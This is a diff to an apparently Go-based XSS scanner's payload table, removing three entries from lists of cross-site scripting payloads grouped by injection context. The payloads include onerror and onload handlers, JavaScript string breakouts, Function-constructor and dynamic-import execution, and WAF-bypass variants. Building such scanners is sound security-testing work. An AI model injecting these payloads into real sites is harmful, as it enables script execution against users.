@@ -51,7 +51,6 @@ var payloadTemplates = map[context.ContextType][]PayloadTemplate{
 		{Value: `<img src=x onerror=confirm(1)>`, Severity: model.High, Desc: "confirm() when alert blocked"},
 		{Value: `<img src=x onerror=prompt(1)>`, Severity: model.High, Desc: "prompt() when alert blocked"},
 		// Short payloads for length-limited inputs
-		{Value: `<svg/onload=alert(1)>`, Severity: model.High, Desc: "Shortest SVG onload (20 chars)"},
 		{Value: `<script src=//xx.js>`, Severity: model.High, Desc: "Short script include"},
 		// DOM clobbering
 		{Value: `<img name=body onerror=alert(1)>`, Severity: model.High, Desc: "DOM clobber document.body"},
@@ -130,7 +129,6 @@ var payloadTemplates = map[context.ContextType][]PayloadTemplate{
 		// DOM sinks via JS breakout
 		{Value: `';document.write('<script>alert(1)</script>')//`, Severity: model.High, Desc: "document.write via string breakout"},
 		{Value: `';location='javascript:alert(1)'//`, Severity: model.High, Desc: "Location JS URI via breakout"},
-		{Value: `';eval(atob('YWxlcnQoMSk='))//`, Severity: model.High, Desc: "eval atob (base64 alert)"},
 		{Value: `';Function('alert(1)')()//`, Severity: model.High, Desc: "Function constructor via breakout"},
 		{Value: `';import('data:text/javascript,alert(1)')//`, Severity: model.High, Desc: "Dynamic import data URI"},
 		// Alternative JS execution sinks (WAF bypass when alert is blocked)
@@ -141,7 +139,6 @@ var payloadTemplates = map[context.ContextType][]PayloadTemplate{
 	},
 	context.ContextJSTemplateLiteral: {
 		{Value: `${alert(1)}`, Severity: model.High, Desc: "Template literal expression execution"},
-		{Value: `${alert(1)}`, Severity: model.High, Desc: "Template literal alert"},
 		{Value: `${prompt(1)}`, Severity: model.High, Desc: "Template literal prompt"},
 		{Value: `${confirm(1)}`, Severity: model.High, Desc: "Template literal confirm"},
 		{Value: `${Function('alert(1)')()}`, Severity: model.Critical, Desc: "Template literal Function exec"},
